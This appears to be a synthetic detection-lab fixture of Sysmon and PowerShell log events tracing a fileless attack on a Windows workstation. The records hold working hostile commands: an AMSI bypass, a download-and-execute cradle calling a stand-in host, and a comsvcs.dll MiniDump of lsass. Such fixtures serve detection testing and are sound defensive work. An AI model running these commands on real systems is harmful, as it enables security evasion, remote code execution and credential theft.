# Fileless chain, schema 0.5: Word macro -> encoded PowerShell whose script block
# disables AMSI (PowerShell 4104), resolves and contacts a C2 name (Sysmon 22/3),
# then rundll32 comsvcs.dll MiniDump reads lsass.exe (Sysmon 10, dbgcore in the call
# trace) and exits (Sysmon 5). Field shapes follow the OTRF Empire and comsvcs recordings.
{"schema_version":"0.3","event":{"id":"evt_9e109221d7caa1b8198b2dc79831fe4da9d4dfccbb29642a5eafd7fa97d77fa2","category":"process","type":"start","timestamp":"2026-09-20T10:00:00.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3001},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_a12eac27f4529aaeffe2fc9fec47f6ca5f7d8fb87bb4a6daabf596915a2a3bf2","pid":600,"name":"userinit.exe","executable":"C:\\Windows\\System32\\userinit.exe","command_line":"userinit.exe","parent":{"entity_id":"proc_6e8bc084610478cd43dfd5cf570e0da03b10cc0e5b0c193cf6c1ae14cba750f7","pid":4,"name":"System"},"hash":{"sha256":null},"start_time_ticks":null}}
{"schema_version":"0.3","event":{"id":"evt_5d7885d568fb469e3450e581c3b6324c04df72d99ad5dc944bdaacfaa9ab90a7","category":"process","type":"start","timestamp":"2026-09-20T10:00:01.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3002},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_ad5cd7213628e5a27997f5f11482421f174c1a75bfb1a21d2a5ea023e3452e30","pid":1500,"name":"explorer.exe","executable":"C:\\Windows\\explorer.exe","command_line":"C:\\Windows\\explorer.exe","parent":{"entity_id":"proc_4576cd430b65a34d042330c8d095d10751a69c13182e04e300f485794c60c079","pid":600,"name":"userinit.exe"},"hash":{"sha256":null},"start_time_ticks":null}}
{"schema_version":"0.3","event":{"id":"evt_86de009ec3e9bd4d199f31deddae557a5728bdf544598107f09a6ed61ac3991c","category":"process","type":"start","timestamp":"2026-09-20T10:01:00.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3003},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_df789baf03238a42c2d4c26ab95d8c7c2ae0b98831a64b0b5ecceb877fe514a1","pid":4100,"name":"winword.exe","executable":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","command_line":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\bob\\Downloads\\Invoice-0920.docm\"","parent":{"entity_id":"proc_a83703ac3727e3852105d6c94d903e3956b0fb5629d7c2e63c5e5269475e96cb","pid":1500,"name":"explorer.exe"},"hash":{"sha256":null},"start_time_ticks":null}}
{"schema_version":"0.3","event":{"id":"evt_30fb1140019093bcd25c45cf9a84ec66862aef7720a647af58ca75d0fe64c92b","category":"process","type":"start","timestamp":"2026-09-20T10:01:15.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3004},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_62eca783da52372ae09b9d30cd44debe5ba31f16fe80540c37bb4f7c1aaca67b","pid":4200,"name":"powershell.exe","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA","parent":{"entity_id":"proc_22c005fed7bed354d0b26a9a2663edeae6aa760618e3f06acc19cd7d5708c6e2","pid":4100,"name":"winword.exe"},"hash":{"sha256":null},"start_time_ticks":null}}
{"schema_version":"0.5","event":{"id":"evt_4b1a9d274f4327f029f2580b37d42b8bcd57f78ef44498ab8b5765332bc5054e","category":"script_block","type":"execute","timestamp":"2026-09-20T10:01:16.000Z"},"source":{"kind":"windows_event_log","provider":"Microsoft-Windows-PowerShell","channel":"Microsoft-Windows-PowerShell/Operational","record_id":3005},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":"S-1-5-21-1004336348-1177238915-682003330-1105"},"process":{"entity_id":"proc_fde3e0cdb0fe3e62bcd7870153a26a2a78e721e12e7e7054a6585bd94489a92d","pid":4200,"name":"powershell.exe","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null},"script_block":{"script_block_id":"5d9e2f8a-0b1c-4e6f-9a2d-7c3b1e0f4a55","message_number":1,"message_total":1,"path":null,"text":"$Ref=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');$Ref.GetField('amsiInitF'+'ailed','NonPublic,Static').SetValue($null,$true);$wc=New-Object Net.WebClient;IEX $wc.DownloadString('https://update-cdn.example/a')","text_length":232,"text_truncated":false,"text_sha256":"146c62e1c55b84aed90143b3f0983f4e22e073b08f92e7ecd4174e2a1f2e17c3"}}
{"schema_version":"0.5","event":{"id":"evt_ccac489b7fb2413a5102e902bda5eb3c270d312462820cd365bed897aa54334d","category":"dns","type":"query","timestamp":"2026-09-20T10:01:17.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3006},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_fde3e0cdb0fe3e62bcd7870153a26a2a78e721e12e7e7054a6585bd94489a92d","pid":4200,"name":"powershell.exe","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null},"dns":{"query_name":"update-cdn.example","query_status":0,"query_results":"type:  5 edge.update-cdn.example;::ffff:203.0.113.50;"}}
{"schema_version":"0.3","event":{"id":"evt_2f0b1c8edd9c805792ddb99ebbb6f55b91817a7a947c5911e1ed7584b7a43d8d","category":"network","type":"connect","timestamp":"2026-09-20T10:01:18.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3007},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_fde3e0cdb0fe3e62bcd7870153a26a2a78e721e12e7e7054a6585bd94489a92d","pid":4200,"name":"powershell.exe","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null},"network":{"direction":"outbound","protocol":"tcp","source_ip":"10.0.0.24","source_port":50122,"destination_ip":"203.0.113.50","destination_port":443,"destination_hostname":"update-cdn.example"}}
{"schema_version":"0.3","event":{"id":"evt_1a64166687036257ae7b53d069e1960d523bd1167cf67b3b05c060a3f24b358e","category":"process","type":"start","timestamp":"2026-09-20T10:01:35.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3008},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_e9be4057d74b65618f02364107463b9f7b0434a55ac9c2bab29ba2b06d9be2ce","pid":4300,"name":"rundll32.exe","executable":"C:\\Windows\\System32\\rundll32.exe","command_line":"C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\bob\\AppData\\Local\\Temp\\wr.dmp full","parent":{"entity_id":"proc_fde3e0cdb0fe3e62bcd7870153a26a2a78e721e12e7e7054a6585bd94489a92d","pid":4200,"name":"powershell.exe"},"hash":{"sha256":null},"start_time_ticks":null}}
{"schema_version":"0.5","event":{"id":"evt_b95b3f5569f2777307b93b49a1de1b46afe56deddb6b5ee00a1eee7d88559d75","category":"process_access","type":"access","timestamp":"2026-09-20T10:01:36.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3009},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_792efc537e44ab6b2758c55c9e5760698ecc6f6536a5682578b45eb15b71c98f","pid":4300,"name":"rundll32.exe","executable":"C:\\Windows\\System32\\rundll32.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null},"process_access":{"target":{"entity_id":"proc_fc7cf1fb6ae1679625023cf3b09dce482dd5f8bc436335026765b62527ee9bb5","pid":712,"executable":"C:\\Windows\\system32\\lsass.exe","user":null},"granted_access":"0x1fffff","call_trace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9c584|C:\\Windows\\System32\\KERNELBASE.dll+305fe|C:\\Windows\\SYSTEM32\\dbgcore.DLL+9447|C:\\Windows\\System32\\comsvcs.dll+3c56f|C:\\Windows\\System32\\rundll32.exe+3bcf"}}
{"schema_version":"0.3","event":{"id":"evt_a3f7688fb66c7f0631b4ec3a35a522e595fb05fc898947df5cdfee0a2f182aad","category":"file","type":"create","timestamp":"2026-09-20T10:01:37.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3010},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_792efc537e44ab6b2758c55c9e5760698ecc6f6536a5682578b45eb15b71c98f","pid":4300,"name":"rundll32.exe","executable":"C:\\Windows\\System32\\rundll32.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null},"file":{"operation":"create","path":"C:\\Users\\bob\\AppData\\Local\\Temp\\wr.dmp","target_path":null,"previous_path":null,"hash":{"sha256":null}}}
{"schema_version":"0.5","event":{"id":"evt_db6ec7f7126473de8974133d4182dd74b401a7cc063c474e2de777821b79c237","category":"process","type":"stop","timestamp":"2026-09-20T10:01:39.000Z"},"source":{"kind":"sysmon","provider":"Microsoft-Windows-Sysmon","channel":"Microsoft-Windows-Sysmon/Operational","record_id":3011},"agent":{"id":"officer-agent-lab","version":"0.5.0"},"host":{"id":"WS-BOB","hostname":"WS-BOB","os":{"name":"Windows 11 Pro","build":"26100"}},"user":{"name":"bob","domain":"CORP","sid":null},"process":{"entity_id":"proc_792efc537e44ab6b2758c55c9e5760698ecc6f6536a5682578b45eb15b71c98f","pid":4300,"name":"rundll32.exe","executable":"C:\\Windows\\System32\\rundll32.exe","command_line":null,"parent":{"entity_id":null,"pid":null,"name":null},"hash":{"sha256":null},"start_time_ticks":null}}
